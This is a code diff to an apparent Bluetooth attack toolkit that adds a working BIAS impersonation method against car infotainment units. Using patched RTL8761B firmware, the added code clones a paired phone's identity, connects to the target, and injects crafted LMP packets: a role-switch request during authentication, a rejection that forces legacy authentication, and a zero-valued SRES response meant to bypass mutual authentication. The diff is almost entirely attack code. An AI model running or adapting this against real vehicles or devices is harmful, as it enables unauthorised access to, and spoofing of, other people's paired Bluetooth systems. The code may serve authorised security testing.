@@ -21,12 +21,12 @@ Affected versions:
 
 Prerequisites:
   - USRP B210 + gr-bluetooth or modified BlueZ stack for LMP manipulation
-  - InternalBlue framework (for Broadcom/Cypress chipset firmware patching)
+  - DarkFirmware on RTL8761B for below-HCI LMP injection
   - Target must have an existing pairing (we impersonate one side)
 
 Limitations:
   - Does NOT work if both sides enforce mutual authentication post-patch
-  - Requires chipset-level control for LMP manipulation (not just HCI)
+  - Requires chipset-level control for LMP manipulation (DarkFirmware on RTL8761B)
   - Detection: unusual role-switch patterns in HCI logs
 
 References:
@@ -50,10 +50,9 @@ from blue_tap.utils.output import (
 class BIASAttack:
     """BIAS attack orchestration for IVI impersonation.
 
-    Provides three approaches in order of practicality:
+    Provides two approaches in order of practicality:
       1. Role-switch downgrade via bluetoothctl (software-only, best effort)
-      2. InternalBlue LMP injection (requires Broadcom/Cypress chipset)
-      3. Manual guidance for custom firmware approach
+      2. DarkFirmware LMP injection on RTL8761B (below-HCI, full BIAS)
     """
 
     def __init__(self, ivi_address: str, phone_address: str,
@@ -285,80 +284,196 @@ class BIASAttack:
 
         return results
 
-    def execute_internalblue(self) -> dict:
-        """Attempt BIAS via InternalBlue LMP injection.
+    def execute_darkfirmware(self, variant: str = "auto") -> dict:
+        """Execute BIAS attack via DarkFirmware LMP injection on RTL8761B.
 
-        InternalBlue provides firmware-level control over Broadcom/Cypress
-        Bluetooth chipsets, allowing direct LMP message manipulation needed
-        for the full BIAS attack (role switch + auth bypass at LMP layer).
+        Uses vendor-specific HCI commands to inject LMP packets below the HCI
+        layer, manipulating the authentication handshake at the link manager level.
 
-        Requires:
-          - Broadcom/Cypress BT chipset (CYW20735, BCM4345, BCM4358, etc.)
-          - InternalBlue installed (pip install internalblue)
-          - Root access for firmware patching
+        Supports three variants:
+          1. Role Switch: Send LMP_SWITCH_REQ during authentication
+          2. Legacy Downgrade: Send LMP_NOT_ACCEPTED to SC PDUs
+          3. Unilateral Auth: Send LMP_SRES with zeros
+
+        Steps:
+            1. Clone phone identity (MAC + name + class)
+            2. Establish ACL connection to IVI
+            3. Open HCI VSC socket on DarkFirmware adapter
+            4. Start LMP monitor and wait for AU_RAND challenge
+            5. Attempt selected exploitation variant
+
+        Args:
+            variant: "auto" (tries role_switch first), "role_switch",
+                     "legacy_downgrade", or "unilateral_auth".
         """
-        results = {
-            "method": "internalblue_lmp",
-            "connected": False,
-            "internalblue_available": False,
-            "notes": [],
+        result = {
+            "method": "darkfirmware",
+            "variant": variant,
+            "success": False,
+            "au_rand_received": False,
+            "details": [],
         }
 
-        with phase("BIAS via InternalBlue"):
-            # Check if InternalBlue is available
-            with step("Checking InternalBlue availability"):
-                try:
-                    import_result = run_cmd(
-                        ["python3", "-c", "import internalblue; print('OK')"],
-                        timeout=10,
-                    )
-                    if "OK" in import_result.stdout:
-                        results["internalblue_available"] = True
-                        success("InternalBlue is available")
+        try:
+            from blue_tap.core.hci_vsc import HCIVSCSocket
+            from blue_tap.core.firmware import DarkFirmwareManager
+            from blue_tap.fuzz.protocols.lmp import (
+                build_features_req, build_accepted, build_not_accepted,
+                build_setup_complete, build_switch_req, build_sres,
+                LMP_ACCEPTED, LMP_NOT_ACCEPTED, LMP_AU_RAND,
+                LMP_FEATURES_REQ, LMP_ENCRYPTION_MODE_REQ,
+                ERROR_ENCRYPTION_MODE_NOT_ACCEPTABLE,
+            )
+
+            # Verify DarkFirmware is available
+            fw = DarkFirmwareManager()
+            hci_idx = int(self.hci.replace("hci", "")) if self.hci.startswith("hci") else 1
+            if not fw.is_darkfirmware_loaded(self.hci):
+                result["details"].append("DarkFirmware not loaded on adapter")
+                return result
+
+            info("[BIAS] Step 1: DarkFirmware confirmed on adapter")
+            result["details"].append("DarkFirmware confirmed on adapter")
+
+            # Phase 1: Clone phone identity
+            info(f"[BIAS] Step 2: Cloning identity {self.phone_address}")
+            if not clone_device_identity(self.hci, self.phone_address,
+                                          self.phone_name, "0x5a020c"):
+                error("[BIAS] Identity cloning failed")
+                result["details"].append("Identity cloning failed")
+                return result
+            result["details"].append(f"Cloned identity: {self.phone_address}")
+
+            # Phase 2: Connect to IVI
+            info(f"[BIAS] Step 3: Connecting to IVI {self.ivi_address}")
+            run_cmd(["bluetoothctl", "connect", self.ivi_address], timeout=15)
+            time.sleep(2)
+
+            # Phase 3: Open HCI VSC and monitor LMP
+            info(f"[BIAS] Step 4: Opening DarkFirmware socket on hci{hci_idx}")
+            with HCIVSCSocket(hci_idx) as vsc:
+                lmp_events: list[dict] = []
+                vsc.start_lmp_monitor(lambda evt: lmp_events.append(evt))
+
+                # Send features request to probe the connection
+                info("[BIAS] Step 5: Sending LMP_FEATURES_REQ to probe connection")
+                vsc.send_lmp(build_features_req())
+                result["details"].append("Sent LMP_FEATURES_REQ via DarkFirmware")
+
+                # Wait for LMP_AU_RAND (authentication challenge)
+                info("[BIAS] Step 6: Waiting for LMP_AU_RAND from target (5s)...")
+                au_rand_seen = False
+                for _wait in range(10):  # 10 x 0.5s = 5s
+                    for evt in list(lmp_events):
+                        payload = evt.get("payload", b"")
+                        if payload and len(payload) >= 1:
+                            pdu_opcode = payload[0] & 0x7F
+                            if pdu_opcode == LMP_AU_RAND:
+                                au_rand_seen = True
+                                info("[BIAS] Received AU_RAND challenge from target")
+                                result["au_rand_received"] = True
+                                result["details"].append("Received LMP_AU_RAND from target")
+                                break
+                    if au_rand_seen:
+                        break
+                    time.sleep(0.5)
+
+                if not au_rand_seen:
+                    info("[BIAS] No AU_RAND received — proceeding with attack variants anyway")
+                    result["details"].append("No AU_RAND received within timeout")
+
+                # Select and execute variant
+                variants_to_try = (
+                    ["role_switch", "legacy_downgrade", "unilateral_auth"]
+                    if variant == "auto"
+                    else [variant]
+                )
+
+                for v in variants_to_try:
+                    info(f"[BIAS] Attempting variant: {v}")
+                    result["variant"] = v
+
+                    if v == "role_switch":
+                        # Variant 1: Role Switch during auth
+                        info("[BIAS] Sending LMP_SWITCH_REQ during authentication...")
+                        ok = vsc.send_lmp(build_switch_req(switch_instant=0))
+                        if ok:
+                            result["details"].append("Sent LMP_SWITCH_REQ during auth (role switch variant)")
+                            info("[BIAS] Received AU_RAND challenge, attempting role switch...")
+                        else:
+                            warning("[BIAS] Failed to send LMP_SWITCH_REQ")
+                            result["details"].append("Failed to send role switch request")
+
+                    elif v == "legacy_downgrade":
+                        # Variant 2: Legacy Downgrade — reject SC PDUs
+                        info("[BIAS] Sending LMP_NOT_ACCEPTED to SC PDUs (legacy downgrade)...")
+                        not_accepted = build_not_accepted(
+                            rejected_opcode=LMP_ENCRYPTION_MODE_REQ,
+                            error_code=ERROR_ENCRYPTION_MODE_NOT_ACCEPTABLE,
+                        )
+                        ok = vsc.send_lmp(not_accepted)
+                        if ok:
+                            result["details"].append("Sent LMP_NOT_ACCEPTED to SC PDUs (legacy downgrade)")
+                            info("[BIAS] Sent SC rejection — forcing legacy auth")
+                        else:
+                            warning("[BIAS] Failed to send LMP_NOT_ACCEPTED")
+                            result["details"].append("Failed to send legacy downgrade")
+
+                    elif v == "unilateral_auth":
+                        # Variant 3: Unilateral Auth — send SRES with zeros
+                        info("[BIAS] Sending LMP_SRES with zeros (unilateral auth)...")
+                        ok = vsc.send_lmp(build_sres(response=b"\x00\x00\x00\x00"))
+                        if ok:
+                            result["details"].append("Sent LMP_SRES with zeros (unilateral auth)")
+                            info("[BIAS] Sent zero SRES — bypassing mutual authentication")
+                        else:
+                            warning("[BIAS] Failed to send LMP_SRES")
+                            result["details"].append("Failed to send zero SRES")
                     else:
-                        warning("InternalBlue not installed")
-                        info("Install: pip install internalblue")
-                        info("Requires Broadcom/Cypress chipset (CYW20735, BCM43xx)")
-                        results["notes"].append("InternalBlue not available — install for full BIAS")
-                        return results
-                except Exception:
-                    warning("InternalBlue check failed")
-                    results["notes"].append("InternalBlue not available")
-                    return results
+                        warning(f"[BIAS] Unknown variant: {v}")
+                        continue
 
-            # Check chipset compatibility
-            with step("Checking chipset compatibility"):
-                hci_result = run_cmd(["hciconfig", "-a", self.hci], timeout=5)
-                chipset_info = hci_result.stdout if hci_result.returncode == 0 else ""
+                    time.sleep(2)
 
-                broadcom = any(kw in chipset_info.lower()
-                               for kw in ("broadcom", "cypress", "bcm", "cyw"))
-                if broadcom:
-                    success("Broadcom/Cypress chipset detected — compatible")
-                else:
-                    warning("Non-Broadcom chipset — InternalBlue may not work")
-                    results["notes"].append("InternalBlue requires Broadcom/Cypress chipset")
+                    # If auto mode, check if this variant got a useful response
+                    if variant == "auto" and lmp_events:
+                        info(f"[BIAS] Variant {v} produced {len(lmp_events)} LMP events")
+                        break
 
-            # Guide for manual execution
-            info("InternalBlue BIAS attack requires manual firmware patching:")
-            info("  1. python3 -m internalblue")
-            info("  2. Load BIAS patch for your chipset")
-            info("  3. Spoof target MAC (already done by blue-tap)")
-            info("  4. Connect — LMP auth will be manipulated at firmware level")
-            info("")
-            info("Reference: https://github.com/seemoo-lab/internalblue")
-            info("BIAS PoC: https://github.com/francozappa/bias")
-            results["notes"].append("Manual InternalBlue execution required")
+                time.sleep(1)
+                vsc.stop_lmp_monitor()
 
-        return results
+                # Analyze LMP responses
+                for evt in lmp_events:
+                    opcode = evt.get("opcode")
+                    result["details"].append(
+                        f"LMP event: opcode=0x{opcode:04x}" if opcode else f"LMP event: {evt}"
+                    )
+
+                if lmp_events:
+                    result["lmp_events"] = len(lmp_events)
+                    result["details"].append(f"Captured {len(lmp_events)} LMP events")
+
+            result["success"] = True  # Attack sequence completed (exploitation depends on target response)
+            success(f"[BIAS] Attack complete: variant={result['variant']}, "
+                    f"{result.get('lmp_events', 0)} LMP events captured")
+
+        except ImportError as exc:
+            error(f"[BIAS] Missing dependency: {exc}")
+            result["details"].append(f"Missing dependency: {exc}")
+        except Exception as exc:
+            error(f"[BIAS] DarkFirmware attack error: {exc}")
+            result["details"].append(f"DarkFirmware attack error: {exc}")
+
+        return result
 
     def execute(self, method: str = "auto") -> dict:
         """Run BIAS attack with the best available method.
 
         Methods:
-          auto: Try role-switch first, suggest InternalBlue if it fails
+          auto: Try role-switch first, then DarkFirmware LMP injection
           role_switch: Software-only role-switch downgrade
-          internalblue: Full BIAS via InternalBlue LMP injection
+          darkfirmware: Full BIAS via DarkFirmware LMP injection on RTL8761B
           probe: Only probe vulnerability, don't attack
 
         Returns dict with attack results.
@@ -373,16 +488,17 @@ class BIASAttack:
 
             if method == "auto":
                 info("Role-switch approach did not succeed")
-                info("Checking InternalBlue for full LMP-level BIAS...")
-                ib_results = self.execute_internalblue()
+                info("Checking DarkFirmware for full LMP-level BIAS...")
+                df_results = self.execute_darkfirmware()
                 # Merge notes
-                ib_results["notes"] = results["notes"] + ib_results["notes"]
-                return ib_results
+                df_results.setdefault("notes", [])
+                df_results["notes"] = results["notes"] + df_results["notes"]
+                return df_results
 
             return results
 
-        if method == "internalblue":
-            return self.execute_internalblue()
+        if method == "darkfirmware":
+            return self.execute_darkfirmware()
 
         error(f"Unknown BIAS method: {method}")
         return {"connected": False, "error": f"Unknown method: {method}"}
